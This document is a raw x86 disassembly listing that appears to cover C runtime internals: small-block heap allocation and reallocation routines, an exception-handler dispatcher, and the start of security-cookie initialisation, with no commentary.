  425334:	mov    ebx,DWORD PTR [ecx+0x4]
  425337:	mov    DWORD PTR [ebx+0x8],ecx
  42533a:	mov    ebx,DWORD PTR [ecx+0x4]
  42533d:	cmp    ebx,DWORD PTR [ecx+0x8]
  425340:	jne    0x425399
  425342:	mov    cl,BYTE PTR [edi+eax*1+0x4]
  425346:	mov    BYTE PTR [ebp+0x13],cl
  425349:	inc    cl
  42534b:	cmp    edi,0x20
  42534e:	mov    BYTE PTR [edi+eax*1+0x4],cl
  425352:	jae    0x425370
  425354:	cmp    BYTE PTR [ebp+0x13],0x0
  425358:	jne    0x425368
  42535a:	mov    ecx,edi
  42535c:	mov    ebx,0x80000000
  425361:	shr    ebx,cl
  425363:	mov    ecx,DWORD PTR [ebp+0x8]
  425366:	or     DWORD PTR [ecx],ebx
  425368:	lea    eax,[eax+edx*4+0x44]
  42536c:	mov    ecx,edi
  42536e:	jmp    0x425390
  425370:	cmp    BYTE PTR [ebp+0x13],0x0
  425374:	jne    0x425386
  425376:	lea    ecx,[edi-0x20]
  425379:	mov    ebx,0x80000000
  42537e:	shr    ebx,cl
  425380:	mov    ecx,DWORD PTR [ebp+0x8]
  425383:	or     DWORD PTR [ecx+0x4],ebx
  425386:	lea    eax,[eax+edx*4+0xc4]
  42538d:	lea    ecx,[edi-0x20]
  425390:	mov    edx,0x80000000
  425395:	shr    edx,cl
  425397:	or     DWORD PTR [eax],edx
  425399:	mov    edx,DWORD PTR [ebp+0xc]
  42539c:	mov    ecx,DWORD PTR [ebp-0x4]
  42539f:	lea    eax,[edx+esi*1-0x4]
  4253a3:	mov    DWORD PTR [eax],ecx
  4253a5:	mov    DWORD PTR [ecx+eax*1-0x4],ecx
  4253a9:	jmp    0x4253ae
  4253ab:	mov    edx,DWORD PTR [ebp+0xc]
  4253ae:	lea    eax,[esi+0x1]
  4253b1:	mov    DWORD PTR [edx-0x4],eax
  4253b4:	mov    DWORD PTR [edx+esi*1-0x8],eax
  4253b8:	jmp    0x4254f9
  4253bd:	xor    eax,eax
  4253bf:	jmp    0x4254fc
  4253c4:	jge    0x4254f9
  4253ca:	mov    ebx,DWORD PTR [ebp+0xc]
  4253cd:	sub    DWORD PTR [ebp+0x10],esi
  4253d0:	lea    ecx,[esi+0x1]
  4253d3:	mov    DWORD PTR [ebx-0x4],ecx
  4253d6:	lea    ebx,[ebx+esi*1-0x4]
  4253da:	mov    esi,DWORD PTR [ebp+0x10]
  4253dd:	sar    esi,0x4
  4253e0:	dec    esi
  4253e1:	cmp    esi,0x3f
  4253e4:	mov    DWORD PTR [ebp+0xc],ebx
  4253e7:	mov    DWORD PTR [ebx-0x4],ecx
  4253ea:	jbe    0x4253ef
  4253ec:	push   0x3f
  4253ee:	pop    esi
  4253ef:	test   BYTE PTR [ebp-0x4],0x1
  4253f3:	jne    0x425479
  4253f9:	mov    esi,DWORD PTR [ebp-0x4]
  4253fc:	sar    esi,0x4
  4253ff:	dec    esi
  425400:	cmp    esi,0x3f
  425403:	jbe    0x425408
  425405:	push   0x3f
  425407:	pop    esi
  425408:	mov    ecx,DWORD PTR [edi+0x4]
  42540b:	cmp    ecx,DWORD PTR [edi+0x8]
  42540e:	jne    0x425452
  425410:	cmp    esi,0x20
  425413:	mov    ebx,0x80000000
  425418:	jae    0x425433
  42541a:	mov    ecx,esi
  42541c:	shr    ebx,cl
  42541e:	lea    esi,[esi+eax*1+0x4]
  425422:	not    ebx
  425424:	and    DWORD PTR [eax+edx*4+0x44],ebx
  425428:	dec    BYTE PTR [esi]
  42542a:	jne    0x42544f
  42542c:	mov    ecx,DWORD PTR [ebp+0x8]
  42542f:	and    DWORD PTR [ecx],ebx
  425431:	jmp    0x42544f
  425433:	lea    ecx,[esi-0x20]
  425436:	shr    ebx,cl
  425438:	lea    ecx,[esi+eax*1+0x4]
  42543c:	not    ebx
  42543e:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  425445:	dec    BYTE PTR [ecx]
  425447:	jne    0x42544f
  425449:	mov    ecx,DWORD PTR [ebp+0x8]
  42544c:	and    DWORD PTR [ecx+0x4],ebx
  42544f:	mov    ebx,DWORD PTR [ebp+0xc]
  425452:	mov    ecx,DWORD PTR [edi+0x8]
  425455:	mov    esi,DWORD PTR [edi+0x4]
  425458:	mov    DWORD PTR [ecx+0x4],esi
  42545b:	mov    esi,DWORD PTR [edi+0x8]
  42545e:	mov    ecx,DWORD PTR [edi+0x4]
  425461:	mov    DWORD PTR [ecx+0x8],esi
  425464:	mov    esi,DWORD PTR [ebp+0x10]
  425467:	add    esi,DWORD PTR [ebp-0x4]
  42546a:	mov    DWORD PTR [ebp+0x10],esi
  42546d:	sar    esi,0x4
  425470:	dec    esi
  425471:	cmp    esi,0x3f
  425474:	jbe    0x425479
  425476:	push   0x3f
  425478:	pop    esi
  425479:	mov    ecx,DWORD PTR [ebp-0xc]
  42547c:	lea    ecx,[ecx+esi*8]
  42547f:	mov    edi,DWORD PTR [ecx+0x4]
  425482:	mov    DWORD PTR [ebx+0x8],ecx
  425485:	mov    DWORD PTR [ebx+0x4],edi
  425488:	mov    DWORD PTR [ecx+0x4],ebx
  42548b:	mov    ecx,DWORD PTR [ebx+0x4]
  42548e:	mov    DWORD PTR [ecx+0x8],ebx
  425491:	mov    ecx,DWORD PTR [ebx+0x4]
  425494:	cmp    ecx,DWORD PTR [ebx+0x8]
  425497:	jne    0x4254f0
  425499:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  42549d:	mov    BYTE PTR [ebp+0xf],cl
  4254a0:	inc    cl
  4254a2:	cmp    esi,0x20
  4254a5:	mov    BYTE PTR [esi+eax*1+0x4],cl
  4254a9:	jae    0x4254c7
  4254ab:	cmp    BYTE PTR [ebp+0xf],0x0
  4254af:	jne    0x4254bf
  4254b1:	mov    ecx,esi
  4254b3:	mov    edi,0x80000000
  4254b8:	shr    edi,cl
  4254ba:	mov    ecx,DWORD PTR [ebp+0x8]
  4254bd:	or     DWORD PTR [ecx],edi
  4254bf:	lea    eax,[eax+edx*4+0x44]
  4254c3:	mov    ecx,esi
  4254c5:	jmp    0x4254e7
  4254c7:	cmp    BYTE PTR [ebp+0xf],0x0
  4254cb:	jne    0x4254dd
  4254cd:	lea    ecx,[esi-0x20]
  4254d0:	mov    edi,0x80000000
  4254d5:	shr    edi,cl
  4254d7:	mov    ecx,DWORD PTR [ebp+0x8]
  4254da:	or     DWORD PTR [ecx+0x4],edi
  4254dd:	lea    eax,[eax+edx*4+0xc4]
  4254e4:	lea    ecx,[esi-0x20]
  4254e7:	mov    edx,0x80000000
  4254ec:	shr    edx,cl
  4254ee:	or     DWORD PTR [eax],edx
  4254f0:	mov    eax,DWORD PTR [ebp+0x10]
  4254f3:	mov    DWORD PTR [ebx],eax
  4254f5:	mov    DWORD PTR [eax+ebx*1-0x4],eax
  4254f9:	xor    eax,eax
  4254fb:	inc    eax
  4254fc:	pop    edi
  4254fd:	pop    esi
  4254fe:	pop    ebx
  4254ff:	leave  
  425500:	ret    
  425501:	push   ebp
  425502:	mov    ebp,esp
  425504:	sub    esp,0x14
  425507:	mov    ecx,DWORD PTR [ebp+0x8]
  42550a:	mov    eax,ds:0x45ffdc
  42550f:	mov    edx,DWORD PTR ds:0x45ffe0
  425515:	add    ecx,0x17
  425518:	and    ecx,0xfffffff0
  42551b:	push   ebx
  42551c:	mov    DWORD PTR [ebp-0x10],ecx
  42551f:	sar    ecx,0x4
  425522:	push   esi
  425523:	lea    eax,[eax+eax*4]
  425526:	push   edi
  425527:	dec    ecx
  425528:	cmp    ecx,0x20
  42552b:	lea    edi,[edx+eax*4]
  42552e:	mov    DWORD PTR [ebp-0x4],edi
  425531:	jge    0x42553e
  425533:	or     esi,0xffffffff
  425536:	shr    esi,cl
  425538:	or     DWORD PTR [ebp-0x8],0xffffffff
  42553c:	jmp    0x42554b
  42553e:	add    ecx,0xffffffe0
  425541:	or     eax,0xffffffff
  425544:	xor    esi,esi
  425546:	shr    eax,cl
  425548:	mov    DWORD PTR [ebp-0x8],eax
  42554b:	mov    eax,ds:0x45ffe8
  425550:	mov    ebx,eax
  425552:	mov    DWORD PTR [ebp-0xc],esi
  425555:	cmp    ebx,edi
  425557:	jmp    0x42556d
  425559:	mov    ecx,DWORD PTR [ebx+0x4]
  42555c:	mov    edi,DWORD PTR [ebx]
  42555e:	and    ecx,DWORD PTR [ebp-0x8]
  425561:	and    edi,esi
  425563:	or     ecx,edi
  425565:	jne    0x425572
  425567:	add    ebx,0x14
  42556a:	cmp    ebx,DWORD PTR [ebp-0x4]
  42556d:	mov    DWORD PTR [ebp+0x8],ebx
  425570:	jb     0x425559
  425572:	cmp    ebx,DWORD PTR [ebp-0x4]
  425575:	jne    0x42559b
  425577:	mov    ebx,edx
  425579:	jmp    0x42558c
  42557b:	mov    ecx,DWORD PTR [ebx+0x4]
  42557e:	mov    edi,DWORD PTR [ebx]
  425580:	and    ecx,DWORD PTR [ebp-0x8]
  425583:	and    edi,esi
  425585:	or     ecx,edi
  425587:	jne    0x425593
  425589:	add    ebx,0x14
  42558c:	cmp    ebx,eax
  42558e:	mov    DWORD PTR [ebp+0x8],ebx
  425591:	jb     0x42557b
  425593:	cmp    ebx,eax
  425595:	je     0x42562f
  42559b:	mov    DWORD PTR ds:0x45ffe8,ebx
  4255a1:	mov    eax,DWORD PTR [ebx+0x10]
  4255a4:	mov    edx,DWORD PTR [eax]
  4255a6:	cmp    edx,0xffffffff
  4255a9:	mov    DWORD PTR [ebp-0x4],edx
  4255ac:	je     0x4255c2
  4255ae:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  4255b5:	mov    edi,DWORD PTR [eax+edx*4+0x44]
  4255b9:	and    ecx,DWORD PTR [ebp-0x8]
  4255bc:	and    edi,esi
  4255be:	or     ecx,edi
  4255c0:	jne    0x4255f8
  4255c2:	mov    edx,DWORD PTR [eax+0xc4]
  4255c8:	and    edx,DWORD PTR [ebp-0x8]
  4255cb:	and    DWORD PTR [ebp-0x4],0x0
  4255cf:	lea    ecx,[eax+0x44]
  4255d2:	mov    esi,DWORD PTR [ecx]
  4255d4:	and    esi,DWORD PTR [ebp-0xc]
  4255d7:	or     edx,esi
  4255d9:	mov    esi,DWORD PTR [ebp-0xc]
  4255dc:	jne    0x4255f5
  4255de:	mov    edx,DWORD PTR [ecx+0x84]
  4255e4:	and    edx,DWORD PTR [ebp-0x8]
  4255e7:	inc    DWORD PTR [ebp-0x4]
  4255ea:	add    ecx,0x4
  4255ed:	mov    edi,DWORD PTR [ecx]
  4255ef:	and    edi,esi
  4255f1:	or     edx,edi
  4255f3:	je     0x4255de
  4255f5:	mov    edx,DWORD PTR [ebp-0x4]
  4255f8:	mov    ecx,edx
  4255fa:	imul   ecx,ecx,0x204
  425600:	lea    ecx,[ecx+eax*1+0x144]
  425607:	mov    DWORD PTR [ebp-0xc],ecx
  42560a:	mov    ecx,DWORD PTR [eax+edx*4+0x44]
  42560e:	xor    edi,edi
  425610:	and    ecx,esi
  425612:	jne    0x425681
  425614:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  42561b:	and    ecx,DWORD PTR [ebp-0x8]
  42561e:	push   0x20
  425620:	pop    edi
  425621:	jmp    0x425681
  425623:	cmp    DWORD PTR [ebx+0x8],0x0
  425627:	jne    0x425634
  425629:	add    ebx,0x14
  42562c:	mov    DWORD PTR [ebp+0x8],ebx
  42562f:	cmp    ebx,DWORD PTR [ebp-0x4]
  425632:	jb     0x425623
  425634:	cmp    ebx,DWORD PTR [ebp-0x4]
  425637:	jne    0x42565f
  425639:	mov    ebx,edx
  42563b:	jmp    0x425646
  42563d:	cmp    DWORD PTR [ebx+0x8],0x0
  425641:	jne    0x42564d
  425643:	add    ebx,0x14
  425646:	cmp    ebx,eax
  425648:	mov    DWORD PTR [ebp+0x8],ebx
  42564b:	jb     0x42563d
  42564d:	cmp    ebx,eax
  42564f:	jne    0x42565f
  425651:	call   0x425065
  425656:	mov    ebx,eax
  425658:	test   ebx,ebx
  42565a:	mov    DWORD PTR [ebp+0x8],ebx
  42565d:	je     0x425677
  42565f:	push   ebx
  425660:	call   0x42511c
  425665:	pop    ecx
  425666:	mov    ecx,DWORD PTR [ebx+0x10]
  425669:	mov    DWORD PTR [ecx],eax
  42566b:	mov    eax,DWORD PTR [ebx+0x10]
  42566e:	cmp    DWORD PTR [eax],0xffffffff
  425671:	jne    0x42559b
  425677:	xor    eax,eax
  425679:	jmp    0x4257f8
  42567e:	shl    ecx,1
  425680:	inc    edi
  425681:	test   ecx,ecx
  425683:	jge    0x42567e
  425685:	mov    ecx,DWORD PTR [ebp-0xc]
  425688:	mov    edx,DWORD PTR [ecx+edi*8+0x4]
  42568c:	mov    ecx,DWORD PTR [edx]
  42568e:	sub    ecx,DWORD PTR [ebp-0x10]
  425691:	mov    esi,ecx
  425693:	sar    esi,0x4
  425696:	dec    esi
  425697:	cmp    esi,0x3f
  42569a:	mov    DWORD PTR [ebp-0x8],ecx
  42569d:	jle    0x4256a2
  42569f:	push   0x3f
  4256a1:	pop    esi
  4256a2:	cmp    esi,edi
  4256a4:	je     0x4257ab
  4256aa:	mov    ecx,DWORD PTR [edx+0x4]
  4256ad:	cmp    ecx,DWORD PTR [edx+0x8]
  4256b0:	jne    0x42570e
  4256b2:	cmp    edi,0x20
  4256b5:	mov    ebx,0x80000000
  4256ba:	jge    0x4256e2
  4256bc:	mov    ecx,edi
  4256be:	shr    ebx,cl
  4256c0:	mov    ecx,DWORD PTR [ebp-0x4]
  4256c3:	lea    edi,[eax+edi*1+0x4]
  4256c7:	not    ebx
  4256c9:	mov    DWORD PTR [ebp-0x14],ebx
  4256cc:	and    ebx,DWORD PTR [eax+ecx*4+0x44]
  4256d0:	mov    DWORD PTR [eax+ecx*4+0x44],ebx
  4256d4:	dec    BYTE PTR [edi]
  4256d6:	jne    0x42570b
  4256d8:	mov    ecx,DWORD PTR [ebp-0x14]
  4256db:	mov    ebx,DWORD PTR [ebp+0x8]
  4256de:	and    DWORD PTR [ebx],ecx
  4256e0:	jmp    0x42570e
  4256e2:	lea    ecx,[edi-0x20]
  4256e5:	shr    ebx,cl
  4256e7:	mov    ecx,DWORD PTR [ebp-0x4]
  4256ea:	lea    ecx,[eax+ecx*4+0xc4]
  4256f1:	lea    edi,[eax+edi*1+0x4]
  4256f5:	not    ebx
  4256f7:	and    DWORD PTR [ecx],ebx
  4256f9:	dec    BYTE PTR [edi]
  4256fb:	mov    DWORD PTR [ebp-0x14],ebx
  4256fe:	jne    0x42570b
  425700:	mov    ebx,DWORD PTR [ebp+0x8]
  425703:	mov    ecx,DWORD PTR [ebp-0x14]
  425706:	and    DWORD PTR [ebx+0x4],ecx
  425709:	jmp    0x42570e
  42570b:	mov    ebx,DWORD PTR [ebp+0x8]
  42570e:	cmp    DWORD PTR [ebp-0x8],0x0
  425712:	mov    ecx,DWORD PTR [edx+0x8]
  425715:	mov    edi,DWORD PTR [edx+0x4]
  425718:	mov    DWORD PTR [ecx+0x4],edi
  42571b:	mov    ecx,DWORD PTR [edx+0x4]
  42571e:	mov    edi,DWORD PTR [edx+0x8]
  425721:	mov    DWORD PTR [ecx+0x8],edi
  425724:	je     0x4257b7
  42572a:	mov    ecx,DWORD PTR [ebp-0xc]
  42572d:	lea    ecx,[ecx+esi*8]
  425730:	mov    edi,DWORD PTR [ecx+0x4]
  425733:	mov    DWORD PTR [edx+0x8],ecx
  425736:	mov    DWORD PTR [edx+0x4],edi
  425739:	mov    DWORD PTR [ecx+0x4],edx
  42573c:	mov    ecx,DWORD PTR [edx+0x4]
  42573f:	mov    DWORD PTR [ecx+0x8],edx
  425742:	mov    ecx,DWORD PTR [edx+0x4]
  425745:	cmp    ecx,DWORD PTR [edx+0x8]
  425748:	jne    0x4257a8
  42574a:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  42574e:	mov    BYTE PTR [ebp+0xb],cl
  425751:	inc    cl
  425753:	cmp    esi,0x20
  425756:	mov    BYTE PTR [esi+eax*1+0x4],cl
  42575a:	jge    0x42577f
  42575c:	cmp    BYTE PTR [ebp+0xb],0x0
  425760:	jne    0x42576d
  425762:	mov    edi,0x80000000
  425767:	mov    ecx,esi
  425769:	shr    edi,cl
  42576b:	or     DWORD PTR [ebx],edi
  42576d:	mov    ecx,esi
  42576f:	mov    edi,0x80000000
  425774:	shr    edi,cl
  425776:	mov    ecx,DWORD PTR [ebp-0x4]
  425779:	or     DWORD PTR [eax+ecx*4+0x44],edi
  42577d:	jmp    0x4257a8
  42577f:	cmp    BYTE PTR [ebp+0xb],0x0
  425783:	jne    0x425792
  425785:	lea    ecx,[esi-0x20]
  425788:	mov    edi,0x80000000
  42578d:	shr    edi,cl
  42578f:	or     DWORD PTR [ebx+0x4],edi
  425792:	mov    ecx,DWORD PTR [ebp-0x4]
  425795:	lea    edi,[eax+ecx*4+0xc4]
  42579c:	lea    ecx,[esi-0x20]
  42579f:	mov    esi,0x80000000
  4257a4:	shr    esi,cl
  4257a6:	or     DWORD PTR [edi],esi
  4257a8:	mov    ecx,DWORD PTR [ebp-0x8]
  4257ab:	test   ecx,ecx
  4257ad:	je     0x4257ba
  4257af:	mov    DWORD PTR [edx],ecx
  4257b1:	mov    DWORD PTR [ecx+edx*1-0x4],ecx
  4257b5:	jmp    0x4257ba
  4257b7:	mov    ecx,DWORD PTR [ebp-0x8]
  4257ba:	mov    esi,DWORD PTR [ebp-0x10]
  4257bd:	add    edx,ecx
  4257bf:	lea    ecx,[esi+0x1]
  4257c2:	mov    DWORD PTR [edx],ecx
  4257c4:	mov    DWORD PTR [edx+esi*1-0x4],ecx
  4257c8:	mov    esi,DWORD PTR [ebp-0xc]
  4257cb:	mov    ecx,DWORD PTR [esi]
  4257cd:	test   ecx,ecx
  4257cf:	lea    edi,[ecx+0x1]
  4257d2:	mov    DWORD PTR [esi],edi
  4257d4:	jne    0x4257f0
  4257d6:	cmp    ebx,DWORD PTR ds:0x45ffd8
  4257dc:	jne    0x4257f0
  4257de:	mov    ecx,DWORD PTR [ebp-0x4]
  4257e1:	cmp    ecx,DWORD PTR ds:0x45fff0
  4257e7:	jne    0x4257f0
  4257e9:	and    DWORD PTR ds:0x45ffd8,0x0
  4257f0:	mov    ecx,DWORD PTR [ebp-0x4]
  4257f3:	mov    DWORD PTR [eax],ecx
  4257f5:	lea    eax,[edx+0x4]
  4257f8:	pop    edi
  4257f9:	pop    esi
  4257fa:	pop    ebx
  4257fb:	leave  
  4257fc:	ret    
  4257fd:	int3   
  4257fe:	int3   
  4257ff:	int3   
  425800:	push   esi
  425801:	inc    ebx
  425802:	xor    dh,BYTE PTR [eax]
  425804:	pop    eax
  425805:	inc    ebx
  425806:	xor    BYTE PTR [eax],dh
  425808:	push   ebp
  425809:	mov    ebp,esp
  42580b:	sub    esp,0x8
  42580e:	push   ebx
  42580f:	push   esi
  425810:	push   edi
  425811:	push   ebp
  425812:	cld    
  425813:	mov    ebx,DWORD PTR [ebp+0xc]
  425816:	mov    eax,DWORD PTR [ebp+0x8]
  425819:	test   DWORD PTR [eax+0x4],0x6
  425820:	jne    0x4258a8
  425826:	mov    DWORD PTR [ebp-0x8],eax
  425829:	mov    eax,DWORD PTR [ebp+0x10]
  42582c:	mov    DWORD PTR [ebp-0x4],eax
  42582f:	lea    eax,[ebp-0x8]
  425832:	mov    DWORD PTR [ebx-0x4],eax
  425835:	mov    esi,DWORD PTR [ebx+0xc]
  425838:	mov    edi,DWORD PTR [ebx+0x8]
  42583b:	cmp    esi,0xffffffff
  42583e:	je     0x4258a1
  425840:	lea    ecx,[esi+esi*2]
  425843:	cmp    DWORD PTR [edi+ecx*4+0x4],0x0
  425848:	je     0x42588f
  42584a:	push   esi
  42584b:	push   ebp
  42584c:	lea    ebp,[ebx+0x10]
  42584f:	call   DWORD PTR [edi+ecx*4+0x4]
  425853:	pop    ebp
  425854:	pop    esi
  425855:	mov    ebx,DWORD PTR [ebp+0xc]
  425858:	or     eax,eax
  42585a:	je     0x42588f
  42585c:	js     0x42589a
  42585e:	mov    edi,DWORD PTR [ebx+0x8]
  425861:	push   ebx
  425862:	call   0x426790
  425867:	add    esp,0x4
  42586a:	lea    ebp,[ebx+0x10]
  42586d:	push   esi
  42586e:	push   ebx
  42586f:	call   0x4267d2
  425874:	add    esp,0x8
  425877:	lea    ecx,[esi+esi*2]
  42587a:	push   0x1
  42587c:	mov    eax,DWORD PTR [edi+ecx*4+0x8]
  425880:	call   0x426866
  425885:	mov    eax,DWORD PTR [edi+ecx*4]
  425888:	mov    DWORD PTR [ebx+0xc],eax
  42588b:	call   DWORD PTR [edi+ecx*4+0x8]
  42588f:	mov    edi,DWORD PTR [ebx+0x8]
  425892:	lea    ecx,[esi+esi*2]
  425895:	mov    esi,DWORD PTR [edi+ecx*4]
  425898:	jmp    0x42583b
  42589a:	mov    eax,0x0
  42589f:	jmp    0x4258bd
  4258a1:	mov    eax,0x1
  4258a6:	jmp    0x4258bd
  4258a8:	push   ebp
  4258a9:	lea    ebp,[ebx+0x10]
  4258ac:	push   0xffffffff
  4258ae:	push   ebx
  4258af:	call   0x4267d2
  4258b4:	add    esp,0x8
  4258b7:	pop    ebp
  4258b8:	mov    eax,0x1
  4258bd:	pop    ebp
  4258be:	pop    edi
  4258bf:	pop    esi
  4258c0:	pop    ebx
  4258c1:	mov    esp,ebp
  4258c3:	pop    ebp
  4258c4:	ret    
  4258c5:	push   ebp
  4258c6:	mov    ecx,DWORD PTR [esp+0x8]
  4258ca:	mov    ebp,DWORD PTR [ecx]
  4258cc:	mov    eax,DWORD PTR [ecx+0x1c]
  4258cf:	push   eax
  4258d0:	mov    eax,DWORD PTR [ecx+0x18]
  4258d3:	push   eax
  4258d4:	call   0x4267d2
  4258d9:	add    esp,0x8
  4258dc:	pop    ebp
  4258dd:	ret    0x4
  4258e0:	call   0x4237f3
  4258e5:	add    eax,0x8
  4258e8:	ret    
  4258e9:	push   0x14
  4258eb:	push   0x4287a8
  4258f0:	call   0x423940
  4258f5:	mov    edi,DWORD PTR [ebp+0x8]
  4258f8:	xor    ebx,ebx
  4258fa:	cmp    edi,ebx
  4258fc:	jne    0x42590c
  4258fe:	push   DWORD PTR [ebp+0xc]
  425901:	call   0x424662
  425906:	pop    ecx
  425907:	jmp    0x425a90
  42590c:	mov    esi,DWORD PTR [ebp+0xc]
  42590f:	cmp    esi,ebx
  425911:	jne    0x42591f
  425913:	push   edi
  425914:	call   0x42454a
  425919:	pop    ecx
  42591a:	jmp    0x425a8e
  42591f:	cmp    DWORD PTR ds:0x460224,0x3
  425926:	jne    0x425a5a
  42592c:	mov    DWORD PTR [ebp-0x1c],ebx
  42592f:	cmp    esi,0xffffffe0
  425932:	ja     0x425a29
  425938:	push   0x4
  42593a:	call   0x423aff
  42593f:	pop    ecx
  425940:	mov    DWORD PTR [ebp-0x4],ebx
  425943:	push   edi
  425944:	call   0x424d22
  425949:	pop    ecx
  42594a:	mov    DWORD PTR [ebp-0x20],eax
  42594d:	cmp    eax,ebx
  42594f:	je     0x4259f9
  425955:	cmp    esi,DWORD PTR ds:0x45ffe4
  42595b:	ja     0x4259a9
  42595d:	push   esi
  42595e:	push   edi
  42595f:	push   eax
  425960:	call   0x425222
  425965:	add    esp,0xc
  425968:	test   eax,eax
  42596a:	je     0x425971
  42596c:	mov    DWORD PTR [ebp-0x1c],edi
  42596f:	jmp    0x4259a9
  425971:	push   esi
  425972:	call   0x425501
  425977:	pop    ecx
  425978:	mov    DWORD PTR [ebp-0x1c],eax
  42597b:	cmp    eax,ebx
  42597d:	je     0x4259a9
  42597f:	mov    eax,DWORD PTR [edi-0x4]
  425982:	dec    eax
  425983:	mov    DWORD PTR [ebp-0x24],eax
  425986:	cmp    eax,esi
  425988:	jb     0x42598c
  42598a:	mov    eax,esi
  42598c:	push   eax
  42598d:	push   edi
  42598e:	push   DWORD PTR [ebp-0x1c]
  425991:	call   0x424680
  425996:	push   edi
  425997:	call   0x424d22
  42599c:	mov    DWORD PTR [ebp-0x20],eax
  42599f:	push   edi
  4259a0:	push   eax
  4259a1:	call   0x424d4d
  4259a6:	add    esp,0x18
  4259a9:	cmp    DWORD PTR [ebp-0x1c],ebx
  4259ac:	jne    0x4259f9
  4259ae:	cmp    esi,ebx
  4259b0:	jne    0x4259b8
  4259b2:	xor    esi,esi
  4259b4:	inc    esi
  4259b5:	mov    DWORD PTR [ebp+0xc],esi
  4259b8:	add    esi,0xf
  4259bb:	and    esi,0xfffffff0
  4259be:	mov    DWORD PTR [ebp+0xc],esi
  4259c1:	push   esi
  4259c2:	push   ebx
  4259c3:	push   DWORD PTR ds:0x460220
  4259c9:	call   DWORD PTR ds:0x4280d8
  4259cf:	mov    DWORD PTR [ebp-0x1c],eax
  4259d2:	cmp    eax,ebx
  4259d4:	je     0x4259f9
  4259d6:	mov    eax,DWORD PTR [edi-0x4]
  4259d9:	dec    eax
  4259da:	mov    DWORD PTR [ebp-0x24],eax
  4259dd:	cmp    eax,esi
  4259df:	jb     0x4259e3
  4259e1:	mov    eax,esi
  4259e3:	push   eax
  4259e4:	push   edi
  4259e5:	push   DWORD PTR [ebp-0x1c]
  4259e8:	call   0x424680
  4259ed:	push   edi
  4259ee:	push   DWORD PTR [ebp-0x20]
  4259f1:	call   0x424d4d
  4259f6:	add    esp,0x14
  4259f9:	or     DWORD PTR [ebp-0x4],0xffffffff
  4259fd:	call   0x425a51
  425a02:	cmp    DWORD PTR [ebp-0x20],ebx
  425a05:	jne    0x425a29
  425a07:	cmp    esi,ebx
  425a09:	jne    0x425a0e
  425a0b:	xor    esi,esi
  425a0d:	inc    esi
  425a0e:	add    esi,0xf
  425a11:	and    esi,0xfffffff0
  425a14:	mov    DWORD PTR [ebp+0xc],esi
  425a17:	push   esi
  425a18:	push   edi
  425a19:	push   ebx
  425a1a:	push   DWORD PTR ds:0x460220
  425a20:	call   DWORD PTR ds:0x4280e0
  425a26:	mov    DWORD PTR [ebp-0x1c],eax
  425a29:	mov    eax,DWORD PTR [ebp-0x1c]
  425a2c:	cmp    eax,ebx
  425a2e:	jne    0x425a90
  425a30:	cmp    DWORD PTR ds:0x45fea8,ebx
  425a36:	je     0x425a90
  425a38:	push   esi
  425a39:	call   0x426222
  425a3e:	pop    ecx
  425a3f:	test   eax,eax
  425a41:	jne    0x42592c
  425a47:	jmp    0x425a8e
  425a49:	xor    ebx,ebx
  425a4b:	mov    esi,DWORD PTR [ebp+0xc]
  425a4e:	mov    edi,DWORD PTR [ebp+0x8]
  425a51:	push   0x4
  425a53:	call   0x423a6b
  425a58:	pop    ecx
  425a59:	ret    
  425a5a:	xor    eax,eax
  425a5c:	cmp    esi,0xffffffe0
  425a5f:	ja     0x425a77
  425a61:	cmp    esi,ebx
  425a63:	jne    0x425a68
  425a65:	xor    esi,esi
  425a67:	inc    esi
  425a68:	push   esi
  425a69:	push   edi
  425a6a:	push   ebx
  425a6b:	push   DWORD PTR ds:0x460220
  425a71:	call   DWORD PTR ds:0x4280e0
  425a77:	cmp    eax,ebx
  425a79:	jne    0x425a90
  425a7b:	cmp    DWORD PTR ds:0x45fea8,ebx
  425a81:	je     0x425a90
  425a83:	push   esi
  425a84:	call   0x426222
  425a89:	pop    ecx
  425a8a:	test   eax,eax
  425a8c:	jne    0x425a5a
  425a8e:	xor    eax,eax
  425a90:	call   0x42397b
  425a95:	ret    
  425a96:	push   0x10
  425a98:	push   0x4287b8
  425a9d:	call   0x423940
  425aa2:	cmp    DWORD PTR ds:0x460224,0x3
  425aa9:	jne    0x425ae5
  425aab:	push   0x4
  425aad:	call   0x423aff
  425ab2:	pop    ecx
  425ab3:	and    DWORD PTR [ebp-0x4],0x0
  425ab7:	mov    esi,DWORD PTR [ebp+0x8]
  425aba:	push   esi
  425abb:	call   0x424d22
  425ac0:	pop    ecx
  425ac1:	mov    DWORD PTR [ebp-0x1c],eax
  425ac4:	test   eax,eax
  425ac6:	je     0x425ad3
  425ac8:	mov    esi,DWORD PTR [esi-0x4]
  425acb:	sub    esi,0x9
  425ace:	mov    DWORD PTR [ebp-0x20],esi
  425ad1:	jmp    0x425ad6
  425ad3:	mov    esi,DWORD PTR [ebp-0x20]
  425ad6:	or     DWORD PTR [ebp-0x4],0xffffffff
  425ada:	call   0x425b03
  425adf:	cmp    DWORD PTR [ebp-0x1c],0x0
  425ae3:	jne    0x425af8
  425ae5:	push   DWORD PTR [ebp+0x8]
  425ae8:	push   0x0
  425aea:	push   DWORD PTR ds:0x460220
  425af0:	call   DWORD PTR ds:0x4280e4
  425af6:	mov    esi,eax
  425af8:	mov    eax,esi
  425afa:	call   0x42397b
  425aff:	ret    
  425b00:	mov    esi,DWORD PTR [ebp-0x20]
  425b03:	push   0x4
  425b05:	call   0x423a6b
  425b0a:	pop    ecx
  425b0b:	ret    
  425b0c:	push   ebp
  425b0d:	mov    ebp,esp
  425b0f:	sub    esp,0x10
  425b12:	push   esi
  425b13:	lea    eax,[ebp-0x8]
  425b16:	push   eax
  425b17:	call   DWORD PTR ds:0x4280f0
  425b1d:	mov    esi,DWORD PTR [ebp-0x4]
  425b20:	xor    esi,DWORD PTR [ebp-0x8]
  425b23:	call   DWORD PTR ds:0x428044
  425b29:	xor    esi,eax
  425b2b:	call   DWORD PTR ds:0x4280a4
  425b31:	xor    esi,eax
  425b33:	call   DWORD PTR ds:0x4280ec
  425b39:	xor    esi,eax
  425b3b:	lea    eax,[ebp-0x10]
  425b3e:	push   eax
  425b3f:	call   DWORD PTR ds:0x4280e8
  425b45:	mov    eax,DWORD PTR [ebp-0xc]
  425b48:	xor    eax,DWORD PTR [ebp-0x10]
  425b4b:	xor    esi,eax
  425b4d:	mov    DWORD PTR ds:0x45f510,esi
